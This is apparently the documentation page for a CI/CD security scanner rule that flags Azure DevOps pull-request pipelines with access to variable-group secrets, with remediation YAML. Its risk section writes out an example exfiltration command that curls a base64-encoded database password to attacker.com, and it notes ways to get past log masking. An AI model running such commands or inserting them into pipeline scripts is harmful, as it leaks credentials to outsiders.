# Variable Group in PR Job

**Rule ID:** `variable_group_in_pr_job`
**Severity:** Critical
**Category:** Privilege
**Tags:** security, privilege-escalation
**Platform:** Azure DevOps only

## Detection

taudit fires when: the pipeline has a `pr:` trigger (ADO pull request trigger), and at least one Step has `HasAccessTo` a Secret or Identity node marked with `META_VARIABLE_GROUP = "true"`. The variable group marker is set by the ADO parser when it sees a `variables:` block referencing a variable group (`group: MyGroupName`).

## Risk

ADO variable groups hold secrets that are injected into the pipeline's environment. When a PR pipeline references a variable group, those secrets are available to every `script:` and task step in that job — including steps that run attacker-contributed code.

The attack path is straightforward:

1. An external contributor opens a pull request against your ADO repository.
2. Their PR modifies a script called in the pipeline (e.g., `./scripts/build.sh`).
3. The modified script adds a line: `curl https://attacker.com/collect?data=$(echo $PROD_DB_PASSWORD | base64)`.
4. The PR pipeline runs, the modified script executes, and the production database password is exfiltrated.

ADO secret masking attempts to redact known secrets from logs, but masking is bypassable:
- Base64 encoding the secret produces a string that masking does not recognise.
- Writing the secret to a file and exfiltrating the file bypasses log-based masking entirely.
- Outbound HTTP calls to attacker infrastructure carry the secret out of the log entirely.

Variable group secrets are particularly dangerous because they are often shared across pipelines and environments. Compromising a production variable group from a PR pipeline means the attacker has credentials for the production environment.

## Remediation

1. **Immediate — remove variable group references from PR-triggered jobs:**
   ```yaml
   # Before (dangerous)
   trigger: none
   pr:
     branches: [main]
   
   variables:
     - group: ProductionSecrets  # REMOVE THIS from PR pipelines
   
   # After — no variable groups in the PR pipeline
   pr:
     branches: [main]
   
   variables:
     - name: NON_SECRET_VAR
       value: some-value
   ```

2. **Split your pipeline into PR (CI) and CD (deploy) configurations:**

   ```yaml
   # pr-ci.yml — runs on PRs, no secrets
   trigger: none
   pr:
     branches: [main]
   
   # No variable groups. No service connections.
   steps:
     - script: ./build.sh
     - script: ./test.sh
   ```

   ```yaml
   # cd.yml — runs on main branch merges only, has secrets
   trigger:
     branches: [main]
   pr: none
   
   variables:
     - group: ProductionSecrets
   
   stages:
     - stage: Deploy
       jobs:
         - deployment: DeployProd
           environment: Production  # requires approval
   ```

3. **Use environment approvals as a defence-in-depth gate:**
   Even in your CD pipeline, require a manual approval before a job with variable group secrets can run:
   - Go to Pipelines → Environments → [your environment] → Approvals and checks
   - Add an "Approvals" check requiring at least one approver

   Note: taudit accounts for environment approvals by downgrading severity of `authority_propagation` findings that cross approval gates, but `variable_group_in_pr_job` still fires because the variable group is accessible regardless of the approval on a downstream stage.

4. **Verify:** Re-run `taudit scan`. The finding should be gone once the variable group reference is removed from the PR-triggered job. Confirm by reviewing the pipeline YAML — no `group:` reference should appear under a job that is reachable from the `pr:` trigger.

## See also

- [trigger_context_mismatch](trigger_context_mismatch.md) — GHA/ADO: broader trigger context finding
- [service_connection_scope_mismatch](service_connection_scope_mismatch.md) — ADO: service connections in PR context
- [ADO variable groups documentation](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/variable-groups)
- [ADO environment approvals](https://learn.microsoft.com/en-us/azure/devops/pipelines/process/approvals)
